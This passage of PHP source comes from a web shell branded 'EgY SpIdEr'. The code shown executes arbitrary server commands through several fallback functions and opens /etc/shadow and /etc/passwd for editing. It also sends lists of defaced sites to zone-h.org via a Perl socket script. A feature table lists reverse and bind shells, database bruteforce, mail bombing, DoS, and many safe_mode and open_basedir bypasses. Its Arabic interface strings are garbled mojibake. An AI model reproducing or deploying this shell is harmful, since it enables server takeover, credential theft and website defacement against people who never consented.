print \$sock \"\r\n\";
print \$sock \"notify_defacer=\$grupo&notify_domain=http%3A%2F%2F\$site[\$a]&notify_hackmode=22&notify_reason=5&notify=+OK+\r\n\";
close(\$sock);}");
if (touch ($li)==true){$fpl=fopen($li,"w+");fwrite ($fpl,$_REQUEST['zonetxt']);
}else{print "<p>[ Can't complete the operation, try change the current dir with writable one ]<br>";}$zonet=$_REQUEST['zonet'];
if (!function_exists(exec)&&!function_exists(shell_exec)&&!function_exists(popen)&&!function_exists(system)&&!function_exists(passthru))
{print "[ Can't complete the operation !! ]";}
else {callfuncs("chmod 777 $zpl;chmod 777 $li");
ob_start();callfuncs("perl $zpl $li $zonet");ob_clean();
print "<p>[ All sites should be sended to zone-h.org successfully !! ]";die();}
}if ($dlink=='zone'&&!isset($_REQUEST['zonesub'])){
print $sf."<br>";print "<p><pre><textarea cols=50 rows=10 name=zonetxt>
www.site1.com
www.site2.com
</textarea></pre></p>";input ("text","zonet","Hacker-name",35);print " ";
input ("submit","zonesub","Send","");print $ef;die();}
print "</div></b></center>"; print"</td></tr>";print"</table>";print "<br>";
function inisaf($iniv) { $chkini=ini_get($iniv);
if(($chkini || strtolower($chkini)) !=='on'){print"<font color=olive><b>OFF ( Not secured )</b></font>";} else{
print"<font color=red><b>ON ( Secured )</b></font>";}}function inifunc($inif){$chkin=ini_get($inif);
if ($chkin==""){print " <font color=red><b>None</b></font>";}
else {$nchkin=wordwrap($chkin,40,"\n", 1);print "<b><font color=olive>".$nchkin."</font></b>";}}function callocmd($ocmd,$owhich){if(function_exists(exec)){$nval=exec($ocmd);}elseif(!function_exists(exec)){$nval=shell_exec($ocmd);}
elseif(!function_exists(shell_exec)){$opop=popen($ocmd,'r');
while (!feof($opop)){ $nval= fgetc($opop);}}
elseif(!function_exists(popen)){ ob_start();system($ocmd);$nval=ob_get_contents();ob_clean();}elseif(!function_exists(system)){
ob_start();passthru($ocmd);$nval=ob_get_contents();ob_clean();}
if($nval=$owhich){print"<font color=red><b>ON</b></font>";}
else{print"<font color=olive><b>OFF</b></font>";} }
print"<table bgcolor=#191919 style=\"border:2px #dadada solid ;font-size:13px;font-family:tahoma \" width=100% height=%>"; echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href='".$_SERVER['PHP_SELF']."'>BACK</a> ]</b></font></div>"; die(); }


 if(isset($_GET['egy']))
 {
   echo $head;
   echo '<table width=100%><tr><td bgcolor=#000000><div align=center><font face=tahoma size=-2 color=red><b>EgY SpIdEr</b></font></div></td></tr></table><table width=100%>';
   $memf = @file("meminfo");
   if($memf)
    {
      $c = sizeof($memf);
      for($i=0;$i<$c;$i++)
        {
          $info = explode(":",$memf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '<tr><td>'.ws(3).'<font face=tahoma size=-2><b>'.trim($info[0]).'</b></font></td><td><font face=tahoma size=-2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
        }
      echo $r;
    }
   else
    {
       echo '<tr><td>'.ws(3).'<div align=center><font face=tahoma size=-2><b><div align="center">
  <font face="tahoma" size="-2"><b>
  <p align="center">&nbsp;</p>
  <p align="center">
  <font style="FONT-WEIGHT: 500; FONT-SIZE: 100pt" face="Webdings" color="#800000">
<IFRAME WIDTH=100% HEIGHT=671 SRC="http://egyspider.eu/ahmed/about.htm"></IFRAME></font></p>
  <p align="center">&nbsp;</p>
  <div id="n" align="center">
    &nbsp;</div>
  <p>&nbsp;</font></b></div>
</b></font></div></td></tr>';
    }
   echo '</table>';
   echo "<br><div align=center><font face=tahoma size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
   die();
 }
  if(isset($_GET['news']))
 {
   echo $head;
   echo '<table width=100%><tr><td bgcolor=#000000><div align=center><font face=tahoma size=-2 color=red><b>EgY SpIdEr</b></font></div></td></tr></table><table width=100%>';
   $memf = @file("meminfo");
   if($memf)
    {
      $c = sizeof($memf);
      for($i=0;$i<$c;$i++)
        {
          $info = explode(":",$memf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '<tr><td>'.ws(3).'<font face=tahoma size=-2><b>'.trim($info[0]).'</b></font></td><td><font face=tahoma size=-2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
        }
      echo $r;
    }
   else
    {
       echo '<tr><td>'.ws(3).'<div align=center><font face=tahoma size=-2><b><div align="center">
  <font face="tahoma" size="-2"><b>
  <p align="center">&nbsp;</p>
  <p align="center">
  <font style="FONT-WEIGHT: 500; FONT-SIZE: 100pt" face="Webdings" color="#800000">
<IFRAME WIDTH=100% HEIGHT=671 SRC="http://egyspider.eu/ahmed/news.htm"></IFRAME></font></p>
  <p align="center">&nbsp;</p>
  <div id="n" align="center">
    &nbsp;</div>
  <p>&nbsp;</font></b></div>
</b></font></div></td></tr>';
    }
   echo '</table>';
   echo "<br><div align=center><font face=tahoma size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
   die();
 }


if(isset($_GET['5']))
 {$_POST['cmd'] = 'systeminfo';}
if(isset($_GET['6']))
 {$_POST['cmd']='edit_file';$_POST['e_name'] = '/etc/syslog.conf';}
if(isset($_GET['7']))
 {$_POST['cmd']='edit_file';$_POST['e_name'] = '/etc/resolv.conf';}
if(isset($_GET['8']))
 {$_POST['cmd']='edit_file';$_POST['e_name'] = '/etc/hosts';}
if(isset($_GET['9']))
 {$_POST['cmd']='edit_file';$_POST['e_name'] = '/etc/shadow';}
if(isset($_GET['10']))
 {$_POST['cmd']='edit_file';$_POST['e_name'] = '/etc/passwd';}
if(isset($_GET['13']))
 {$_POST['cmd']='cat /proc/cpuinfo';}
if(isset($_GET['14']))
 {$_POST['cmd']='cat /proc/version';}
if(isset($_GET['15']))
 {$_POST['cmd'] = 'free';}
if(isset($_GET['16']))
 {$_POST['cmd'] = 'dmesg(8)';}
if(isset($_GET['17']))
 {$_POST['cmd'] = 'vmstat';}
if(isset($_GET['18']))
 {$_POST['cmd'] = 'lspci';}
if(isset($_GET['19']))
 {$_POST['cmd'] = 'lsdev';}
if(isset($_GET['20']))
 {$_POST['cmd']='cat /proc/interrupts';}
if(isset($_GET['21']))
 {$_POST['cmd'] = 'cat /etc/*realise';}
if(isset($_GET['22']))
 {$_POST['cmd']='edit_file';$_POST['e_name'] = '/etc/issue.net';}
if(isset($_GET['23']))
 {$_POST['cmd'] = 'lsattr -va';}
if(isset($_GET['24']))
 {$_POST['cmd'] = 'w';}
if(isset($_GET['25']))
 {$_POST['cmd'] = 'who';}
if(isset($_GET['26']))
 {$_POST['cmd'] = 'uptime';}
if(isset($_GET['27']))
 {$_POST['cmd'] = 'last -n 10';}
if(isset($_GET['28']))
 {$_POST['cmd'] = 'ps -aux';}
if(isset($_GET['29']))
 {$_POST['cmd'] = 'service --status-all';}
if(isset($_GET['30']))
 {$_POST['cmd'] = 'ifconfig';}
if(isset($_GET['31']))
 {$_POST['cmd'] = 'netstat -a';}
if(isset($_GET['32']))
 {$_POST['cmd']='edit_file';$_POST['e_name'] = '/etc/fstab';}
if(isset($_GET['33']))
 {$_POST['cmd'] = 'fdisk -l';}
if(isset($_GET['34']))
 {$_POST['cmd'] = 'df -h';}

#if(isset($_GET['']))
# {$_POST['cmd'] = '';}

$lang=array(
'ar_text1' =>'«·«„— «·„‰›–',
'ar_text2' =>' ‰›Ì– «·«Ê«„— ›Ì «·”Ì—›—',
'ar_text3' =>'«„— «· ‘€Ì·',
'ar_text4' =>'„ﬂ«‰ ⁄„·ﬂ «·«‰ ⁄·Ï «·”Ì—›—',
'ar_text5' =>'—›⁄ „·› «·Ï «·”Ì—›—',
'ar_text6' =>'„”«— „·›ﬂ',
'ar_text7' =>'«Ê«„— Ã«Â“Â',
'ar_text8' =>'«Œ — «·«„—',
'ar_butt1' =>' ‰›Ì–',
'ar_butt2' =>'—›‹⁄',
'ar_text9' =>'› Õ »Ê—  ›Ì «·”Ì—›— ⁄·Ï /bin/bash',
'ar_text10'=>'»‹Ê— ',
'ar_text11'=>'»«”Ê—œ ··œŒÊ·',
'ar_butt3' =>'› Õ',
'ar_text12'=>'√ ’‹«· ⁄‹ﬂ”Ì',
'ar_text13'=>'«·«Ì »Ì',
'ar_text14'=>'«·„‰›–',
'ar_butt4' =>'√ ‹’«·',
'ar_text15'=>'”Õ» „·›«  «·Ï «·”Ì—›—',
'ar_text16'=>'⁄‰ ÿ—Ìﬁ',
'ar_text17'=>'—«»ÿ «·„·›',
'ar_text18'=>'„ﬂ«‰ ‰“Ê·Â',
'ar_text19'=>'Exploits',
'ar_text20'=>'≈” Œœ„',
'ar_text21'=>'«·«”„ «·ÃœÌœ',
'ar_text22'=>'«‰»Ê» «·»Ì«‰« ',
'ar_text23'=>'«·»Ê—  «·„Õ·Ì',
'ar_text24'=>'«·”Ì—›— «·»⁄Ìœ',
'ar_text25'=>'«·„‰›– «·»⁄Ìœ',
'ar_text26'=>'«” Œœ„',
'ar_butt5' =>' ‘€Ì·',
'ar_text28'=>'«·⁄„· ›Ì «·Ê÷⁄ «·«„‰',
'ar_text29'=>'„„‰Ê⁄ «·œŒÊ·',
'ar_butt6' =>' €Ì—',
'ar_text30'=>'⁄—÷ „·›',
'ar_butt7' =>'⁄—÷',
'ar_text31'=>'«·„·› €Ì— „ÊÃÊœ',
'ar_text32'=>' ‰›Ì– ﬂÊœ php ⁄‰ ÿ—Ìﬁ œ«·Â eval',
'ar_text33'=>'Test bypass open_basedir with cURL functions',
'ar_butt8' =>'«Œ »«—',
'ar_text34'=>'ﬁ—«∆Â «·„·›«  ⁄‰ ÿ—Ìﬁ À€—Â include',
'ar_text35'=>'ﬁ—«∆Â «·„·›«  ⁄‰ ÿ—Ìﬁ À€—Â Mysql',
'ar_text36'=>'«·ﬁ«⁄œ… . «·ÃœÊ·',
'ar_text37'=>'«”„ «·„” Œœ„',
'ar_text38'=>'ﬂ·„… «·„—Ê—',
'ar_text39'=>'«·ﬁ«⁄œ…',
'ar_text40'=>'‰”Œ… „‰ Ãœ«Ê· «·ﬁ«⁄œ…',
'ar_butt9' =>'‰”Œ…',
'ar_text41'=>'Õ›Ÿ «·‰”Œ… ›Ì',
'ar_text42'=>' ⁄œÌ· «·„·›« ',
'ar_text43'=>'«·„·› «·„—«œ  ⁄œÌ·Â',
'ar_butt10'=>'Õ›Ÿ',
'ar_text44'=>'·« ” ÿÌ⁄ «· ⁄œÌ· ⁄·Ï Â–« «·„·› ›ﬁÿ  ﬁ—√',
'ar_text45'=>' „ «·Õ›Ÿ',
'ar_text46'=>'⁄—÷ phpinfo()',
'ar_text47'=>'—ƒÌ… «·„ €Ì—«  ›Ì php.ini',
'ar_text48'=>'„”Õ „·›«  «·‹ temp',
'ar_butt11'=>' Õ—Ì— «·„·›',
'ar_text49'=>'„”Õ «·”ﬂ—»  „‰ «·”Ì—›—',
'ar_text50'=>'⁄—÷ „⁄·Ê„«  «·–«ﬂ—… «·—∆Ì”Ì…',
'ar_text51'=>'⁄—÷ „⁄·Ê„«  «·–«ﬂ—…',
'ar_text52'=>'»ÕÀ ‰’',
'ar_text53'=>'›Ì «·„”«—',
'ar_text54'=>'»ÕÀ ⁄‰ ‰’ ›Ì «·„·›« ',
'ar_butt12'=>'»ÕÀ',
'ar_text55'=>'›ﬁÿ ›Ì «·„·›« ',
'ar_text56'=>'·«ÌÊÃœ :(',
'ar_text57'=>'«‰‘«¡/„”Õ „·›/„Ã·œ',
'ar_text58'=>'«·«”„',
'ar_text59'=>'„·›',
'ar_text60'=>'„Ã·œ',
'ar_butt13'=>'≈‰‘«¡ /„”Õ',
'ar_text61'=>' „ ≈‰‘«¡ «·„·›',
'ar_text62'=>' „ ≈‰‘«¡ «·„Ã·œ',
'ar_text63'=>' „ „”Õ «·„·›',
'ar_text64'=>' „ „”Õ «·„Ã·œ',
'ar_butt65'=>'≈‰‘«¡',
'ar_text66'=>'„”Õ',
'ar_text67'=>'«· ’—ÌÕ/«·„” Œœ„/«·„Ã„Ê⁄…',
'ar_text68'=>'«„—',
'ar_text69'=>'≈”„ «·„·›',
'ar_text70'=>'«· ’—ÌÕ',
'ar_text71'=>"Second commands param is:\r\n- for CHOWN - name of new owner or UID\r\n- for CHGRP - group name or GID\r\n- for CHMOD - 0777, 0755...",
'ar_text72'=>'«·‰’ «·„—«œ',
'ar_text73'=>'»ÕÀ ›Ì «·„Ã·œ« ',
'ar_text74'=>'»ÕÀ ›Ì «·„·›« ',
'ar_text75'=>'* you can use regexp',
'ar_text76'=>'«·»ÕÀ ⁄‰ ‰’ ›Ì „·›«  »Ê«”ÿÂ find',
'ar_text80'=>'«·‰Ê⁄',
'ar_text81'=>'«·≈ ’«·« ',
'ar_text82'=>'ﬁÊ«⁄œ «·»Ì«‰« ',
'ar_text83'=>' ‘€Ì· «„— «” ⁄·«„',
'ar_text84'=>'«” ⁄·«„ ﬁ«⁄œ…',
'ar_text85'=>'Test bypass safe_mode with commands execute via MSSQL server',
'ar_text86'=>' ‰“Ì· „·›«  „‰ «·”Ì—›—',
'ar_butt14'=>' Õ„Ì·',
'ar_text87'=>' ‰“Ì· „·›«  „‰ Œ«œ„ «·«›  Ì »Ì',
'ar_text88'=>'”Ì—›— «·«›  Ì »Ì:«·„‰›–',
'ar_text89'=>'„·› ›Ì «·«›  Ì »Ì',
'ar_text90'=>'«· ÕÊÌ· «·Ï',
'ar_text91'=>'«—‘›…',
'ar_text92'=>'„‰ €Ì— «·«—‘›…',
'ar_text93'=>'«·«›  Ì »Ì',
'ar_text94'=>' Œ„Ì‰ «·«›  Ì »Ì',
'ar_text95'=>'ﬁ«∆„… «·„” Œœ„Ì‰',
'ar_text96'=>'·„ Ì” ÿ⁄ ”Õ» ﬁ«∆„… «·„” Œœ„Ì‰',
'ar_text97'=>' „ «·›Õ’: ',
'ar_text98'=>' „ »‰Ã«Õ: ',
'ar_text99'=>'* «” Œœ„ «”„«¡ «·„” Œœ„Ì‰ ›Ì „·› /etc/passwd ·œŒÊ· ··‹ ftp',
'ar_text100'=>'«—”«· „·› «·Ï Œ«œ„ «·«›  Ì »Ì',
'ar_text101'=>'«” Œœ„ «·«”«„Ì „⁄ﬂÊ”Â · Œ„Ì‰Â«',
'ar_text102'=>'Œœ„«  «·»—Ìœ',
'ar_text103'=>'«—”«· »—Ìœ',
'ar_text104'=>'«—”«· „·› «·Ï «·«Ì„Ì·',
'ar_text105'=>'≈·Ï',
'ar_text106'=>'„‹‰',
'ar_text107'=>'«·„Ê÷Ê⁄',
'ar_butt15'=>'≈—”«·',
'ar_text108'=>'«·—”«·…',
'ar_text109'=>'„Œ›Ì',
'ar_text110'=>'⁄—÷',
'ar_text111'=>'”Ì—›— ﬁÊ«⁄œ «·»Ì«‰«  : «·„‰›–',
'ar_text112'=>'ﬁ—«∆… «·„·›«  ⁄‰ ÿ—Ìﬁ À€—… œ«·Â mb_send_mail',
'ar_text113'=>'ﬁ—«∆… „Õ ÊÏ «·„Ã·œ«  ⁄‰ ÿ—Ìﬁ via imap_list',
'ar_text114'=>'ﬁ—«∆… «·„·›«  ⁄‰ ÿ—Ìﬁ À€—… via imap_body',
'ar_text115'=>'ﬁ—«∆… «·„·›«  ⁄‰ ÿ—Ìﬁ compress.zlib://',
'ar_text116'=>'‰”Œ „‰',
'ar_text117'=>'«·Ï',
'ar_text118'=>' „ ‰”Œ «·„·›',
'ar_text119'=>'·«Ì” ÿÌ⁄ «·‰”Œ',
'ar_err0'=>'Œÿ«¡ ! ·«Ì„ﬂ‰ «·ﬂ «»… ⁄·Ï Â–« «·„·› ',
'ar_err1'=>'Œÿ«¡ ! €Ì— ﬁ«œ— ⁄·Ï ﬁ—«∆Â Â–« «·„·› ',
'ar_err2'=>'Œÿ«¡! ·«Ì„ﬂ‰ «·«‰‘«¡ ',
'ar_err3'=>'Œÿ«¡! €Ì— ﬁ«œ— ⁄·Ï «·« ’«· »«·«›  Ì »Ì',
'ar_err4'=>'Œÿ«¡ ! ·« ” ÿÌ⁄ «·œŒÊ· «·Ï ”Ì—›— «·«›  Ì »Ì',
'ar_err5'=>'Œÿ«¡ ! ·« ” ÿÌ⁄  €Ì— «·„Ã·œ ›Ì «·«›  Ì »Ì',
'ar_err6'=>'Œÿ«¡ ! ·« ” ÿÌ⁄ «—”«· —”«·Â',
'ar_err7'=>'«·»—Ìœ «—”·',
'ar_text200'=>'copy()ﬁ—«∆… «·„·›«  ⁄‰ ÿ—Ìﬁ À€—…',
'ar_text202'=>'„”«— «·„·› «·„—«œ ﬁ—«∆ Â',
'ar_text300'=>'curl()ﬁ—«∆Â «·„·›«  ⁄‰ ÿ—Ìﬁ À€—…',
'ar_text203'=>'ini_restore()ﬁ—«∆… «·„·›«  ⁄‰ ÿ—Ìﬁ À€—…',
'ar_text204'=>'error_log()“—«⁄Â «·„·›«  ⁄‰ ÿ—Ìﬁ À€—Â',
'ar_text205'=>'√“—⁄ «·‘· ⁄·Ï Â–« «·„”«—',
'ar_text206'=>'ﬁ—«∆Â „Õ ÊÌ«  «·„Ã·œ',
'ar_text207'=>'ﬁ—«∆Â „Õ ÊÌ«  «·„Ã·œ«  ⁄‰ ÿ—Ìﬁ À€—Â reg_glob',
'ar_text208'=>' ‰›Ì– «·«Ê«„— ›Ì «·Ê÷⁄ «·«„‰ ⁄‰ ÿ—Ìﬁ «·œÊ«·',
'ar_text209'=>'ﬁ—«∆Â „Õ ÊÌ«  «·„Ã·œ«  ⁄‰ ÿ—Ìﬁ À€—Â root',
'ar_text210'=>'›ﬂ  ‘›Ì— «·“‰œ ',
'ar_text211'=>'::«ﬁ›«· «·”Ì› „Êœ::',
'ar_text212'=>'php.ini «ﬁ›«· «·”Ì› „Êœ ⁄‰ ÿ—Ìﬁ “—⁄ „·›',
'ar_text213'=>'htacces ≈ﬁ›«· «·„Êœ ”ﬂÌÊ— Ì ⁄‰ ÿ—Ìﬁ “—⁄ „·›',
'ar_text214'=>'√”„ «·«œ„‰',
'ar_text215'=>'⁄‰Ê«‰ «·”Ì—›— IRC ',
'ar_text216'=>'# √”„ «·€—›Â „⁄',
'ar_text217'=>'«”„ «·”Ì—›— «·„Œ —ﬁ',
'ar_text218'=>'·≈Ìﬁ«› «·”Ì› „Êœ ini_restore “—⁄ „·› ÌÕ ÊÌ ⁄·Ï À€—Â',
'ar_text219'=>'”Õ» „·›«  «·Ï «·”Ì—›— Ê €Ì— «”„Â« »«·Ê÷⁄ «·«„‰',
'ar_text220'=>'«” ⁄—«÷ «·„·›«  ⁄‰ ÿ—Ìﬁ À€—Â symlink «·ŒÿÊÂ «·«Ê·Ï',
'ar_text221'=>'÷€ÿ «·„·›«  · Õ„Ì·Â« „‰ «·„Êﬁ⁄(»⁄œ  Õ„Ì·Â« ·ÃÂ«“ﬂ €Ì— «„ œ«œ «·„·› ·«„ œ«œÂ «·”«»ﬁ)1',
'ar_text222'=>'«” ⁄—«÷ «·„·›«  ⁄‰ ÿ—Ìﬁ À€—Â symlink «·ŒÿÊÂ «·À«‰ÌÂ',
'ar_text223'=>'ﬁ—«∆Â «·„·›«  ⁄‰ ÿ—Ìﬁ «·œÊ«·',
'ar_text224'=>'PLUGIN ﬁ—«∆Â «·„·›«  ⁄‰ ÿ—Ìﬁ À€—Â ',
'ar_text143'=>'«· „»: ',
'ar_text65'=>'«‰‘«¡',


'ar_text33'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir with cURL functions(PHP <= 4.4.2, 5.1.4)',
'ar_text34'=>'ﬁ—«∆Â «·„·›«  ⁄‰ ÿ—Ìﬁ À€—…  include function',
'ar_text35'=>'ﬁ—«∆Â «·„·›«  ⁄‰ ÿ—Ìﬁ À€—…  load file in mysql',
'ar_text85'=>'ﬁ—«∆Â «·„·›«  ⁄‰ ÿ—Ìﬁ À€—…  commands execute via MSSQL server',
'ar_text112'=>'ﬁ—«∆Â «·„·›«  ⁄‰ ÿ—Ìﬁ À€—…  function mb_send_mail() (PHP <= 4.0-4.2.2, 5.x)',
'ar_text113'=>' ŒÿÏ «·”Ì› „Êœ » safe_mode, view dir list via imap_list() (PHP <= 5.1.2)',
'ar_text114'=>' ŒÿÏ «·”Ì› „Êœ » safe_mode, view file contest via imap_body() (PHP <= 5.1.2)',
'ar_text115'=>' ŒÿÏ «·”Ì› „Êœ » safe_mode, copy file via copy(compress.zlib://) (PHP <= 4.4.2, 5.1.2)',
'ar_text116'=>'Copy from',
'ar_text117'=>'to',
'ar_text118'=>'File copied',
'ar_text119'=>'Cant copy file',
'ar_text120'=>' ŒÿÏ «·”Ì› „Êœ » safe_mode via ini_restore (PHP <= 4.4.4, 5.1.6) by NST',
'ar_text121'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, view dir list via fopen (PHP v4.4.0 memory leak) by NST',
'ar_text122'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, view dir list via glob() (PHP <= 5.2.x)',
'ar_text123'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, read *.bzip file via [compress.bzip2://] (PHP <= 5.2.1)',
'ar_text124'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, add data to file via error_log(php://) (PHP <= 5.1.4, 4.4.2)',
'ar_text126'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, create file via session_save_path[NULL-byte] (PHP <= 5.2.0)',
'ar_text127'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, add data to file via readfile(php://) (PHP <= 5.2.1, 4.4.4)',
'ar_text128'=>'Modify/Access file (touch)',
'ar_text129'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, create file via fopen(srpath://) (PHP v5.2.0)',
'ar_text130'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, read *.zip file via [zip://] (PHP <= 5.2.1)',
'ar_text131'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, view file contest via symlink() (PHP <= 5.2.1)',
'ar_text132'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, view dir list via symlink() (PHP <= 5.2.1)',
'ar_text133'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, create file via session_save_path(TMPDIR) (PHP <= 5.2.4)',
'ar_err3'=>'Error! Can\'t connect to ftp',
'ar_err4'=>'Error! Can\'t login on ftp server',
'ar_err5'=>'Error! Can\'t change dir on ftp',
'ar_err6'=>'Error! Can\'t sent mail',
'ar_err7'=>'Mail send',
'ar_text1' =>'Executed command',
'ar_text2' =>'Execute command on server',
'ar_text33'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir with cURL functions(PHP <= 4.4.2, 5.1.4)',
'ar_text34'=>'ﬁ—«∆Â «·„·›«  ⁄‰ ÿ—Ìﬁ À€—…  include function',
'ar_text35'=>'ﬁ—«∆Â «·„·›«  ⁄‰ ÿ—Ìﬁ À€—…  load file in mysql',
'ar_text112'=>'ﬁ—«∆Â «·„·›«  ⁄‰ ÿ—Ìﬁ À€—…  function mb_send_mail() (PHP <= 4.0-4.2.2, 5.x)',
'ar_text113'=>' ŒÿÏ «·”Ì› „Êœ » safe_mode, view dir list via imap_list() (PHP <= 5.1.2)',
'ar_text114'=>' ŒÿÏ «·”Ì› „Êœ » safe_mode, view file contest via imap_body() (PHP <= 5.1.2)',
'ar_text115'=>' ŒÿÏ «·”Ì› „Êœ » safe_mode, copy file via copy(compress.zlib://) (PHP <= 4.4.2, 5.1.2)',
'ar_text120'=>' ŒÿÏ «·”Ì› „Êœ » safe_mode via ini_restore (PHP <= 4.4.4, 5.1.6) by NST',
'ar_text121'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, view dir list via fopen (PHP v4.4.0 memory leak) by NST',
'ar_text122'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, view dir list via glob() (PHP <= 5.2.x)',
'ar_text123'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, read *.bzip file via [compress.bzip2://] (PHP <= 5.2.1)',
'ar_text124'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, add data to file via error_log(php://) (PHP <= 5.1.4, 4.4.2)',
'ar_text126'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, create file via session_save_path[NULL-byte] (PHP <= 5.2.0)',
'ar_text127'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, add data to file via readfile(php://) (PHP <= 5.2.1, 4.4.4)',
'ar_text128'=>'Modify/Access file (touch)',
'ar_text129'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, create file via fopen(srpath://) (PHP v5.2.0)',
'ar_text130'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, read *.zip file via [zip://] (PHP <= 5.2.1)',
'ar_text131'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, view file contest via symlink() (PHP <= 5.2.1)',
'ar_text132'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, view dir list via symlink() (PHP <= 5.2.1)',
'ar_text133'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, create file via session_save_path(TMPDIR) (PHP <= 5.2.4)',
'ar_text142'=>'Downloaders',
'ar_text137'=>'Useful',
'ar_text128'=>'Modify/Access file (touch)',
'ar_text129'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, create file via fopen(srpath://) (PHP v5.2.0)',
'ar_text130'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, read *.zip file via [zip://] (PHP <= 5.2.1)',
'ar_text131'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, view file contest via symlink() (PHP <= 5.2.1)',
'ar_text132'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, view dir list via symlink() (PHP <= 5.2.1)',
'ar_text133'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, create file via session_save_path(TMPDIR) (PHP <= 5.2.4)',
'ar_text134'=>'Database-bruteforce',
'ar_text135'=>'Dictionary',
'ar_text136'=>'Creating evil symlink',
'ar_text137'=>'Useful',
'ar_text138'=>'Dangerous',
'ar_text139'=>'Mail Bomber',
'ar_text140'=>'DoS',
'ar_text141'=>'Danger! Web-daemon crash possible.',
'ar_text142'=>'Downloaders',
'ar_text143'=>'Temp: ',
'ar_text144'=>'ﬁ—«∆Â «·„·›«  ⁄‰ ÿ—Ìﬁ À€—…  load file in mysqli',
'ar_text145'=>' ŒÿÏ «·”Ì› „Êœ » open_basedir, view dir list via realpath() (PHP <= 5.2.4)',
'ar_text146'=>'Max Interation',
'ar_text147'=>'',
'ar_text148'=>'',
'ar_text149'=>'',
'ar_text150'=>'',
'ar_err0'=>'Error! Can\'t write in file ',
'ar_err1'=>'Error! Can\'t read file ',
'ar_err2'=>'Error! Can\'t create ',
'ar_err3'=>'Error! Can\'t connect to ftp',
'ar_err4'=>'Error! Can\'t login on ftp server',
'ar_err5'=>'Error! Can\'t change dir on ftp',
'ar_err6'=>'Error! Can\'t sent mail',
'ar_err7'=>'Mail send',
'ar_text125'=>'Data',
'ar_text225'=>'“—⁄ „·› · · ŒÿÏ „‰ Œ·«· ﬁ«⁄œÂ «·»Ì«‰«  · 4.4.7 / 5.2.3 PHP ',
'ar_text226'=>' ŒÿÏ «·”Ì› „Êœ »À€—Â Root Directory: ',
'ar_text227'=>'“—⁄ „·› · ŒÿÏ «·”› „Êœ »À€—Â 4.4.2/5.1.2',
'ar_text228'=>'“—⁄ „·› · ŒÿÏ «·Õ„«ÌÂ ·„‰ œ… «·›Ï »Ï  ',
'ar_text230'=>'“—⁄ „·› ·„⁄—›Â ﬂ·„«  «·„—Ê— ·„Ê«ﬁ⁄ «·”Ì—›— »œÊ‰  ‘›Ì— ',
'ar_text151'=>' ŒÿÏ «·”Ì› „Êœ »  chdir()and ftok() (PHP <= 5.2.6)',
'ar_text161'=>' ŒÿÏ «·”Ì› „Êœ »  posix_access() (posix ext) (PHP <= 5.2.6)',
'ar_text147'=>'',
'ar_text148'=>'',
'ar_text149'=>'',
'ar_text150'=>'',
'ar_text159'=>'„⁄·Ê„«  ⁄‰ egy spider',
'ar_text152'=>'«Œ— «·«Œ»«—',
'ar_text153'=>'Œ—ÊÃ ',
'ar_text154'=>'Ê÷⁄ «‰œﬂ” ”—Ì⁄Â ',
'ar_text155'=>'Õﬁ‰ «ﬂÊ«œ ',
'ar_text156'=>'⁄—÷ «·ﬂÊœ ',
'ar_text157'=>'«· ”ÃÌ· ›Ï «·“Ê‰ « ‘ ',
'ar_text158'=>'«œÊ«  «· ‘›Ì—  ',
'ar_text160'=>'«·—∆”ÌÂ  ',
'ar_text162'=>'«ﬁ›«· «·œÊ«·  Ê ŒÿÏ «·”Ì› „Êœ „‰ Œ·«· ionCube (PHP <= 5.2.4)',
'ar_text163'=>' ‘€Ì· «·»Ì—· ⁄·Ï «·”Ì—›— ',
'ar_text170'=>'  ŒÿÏ «·”Ì› „Êœ Ê«·œÊ«· »  Posix_getpw(PHP <= 4.2.0)',
'ar_text171'=>' PHP (Win32std) Extension  ŒÿÏ «·”Ì› „Êœ Ê ŒÿÏ «·œÊ«· (PHP <= 5.2.3)',
'ar_text180'=>'«—”· „·«ÕŸ« ﬂ Ê« ’· »Ï ',
/* --------------------------------------------------------------- */
'eng_butt1' =>'Execute',
'eng_butt2' =>'Upload',
'eng_butt3' =>'Bind',
'eng_butt4' =>'Connect',
'eng_butt5' =>'Run',
'eng_butt6' =>'Change',
'eng_butt7' =>'Show',
'eng_butt8' =>'Test',
'eng_butt9' =>'Dump',
'eng_butt10'=>'Save',
'eng_butt11'=>'Edit file',
'eng_butt12'=>'Find',
'eng_butt13'=>'Create/Delete',
'eng_butt14'=>'Download',
'eng_butt15'=>'Send',
'eng_text1' =>'Executed command',
'eng_text2' =>'Execute command on server',
'eng_text3' =>'Run command',
'eng_text4' =>'Work directory',
'eng_text5' =>'Upload files on server',
'eng_text6' =>'Local file',
'eng_text7' =>'Aliases',
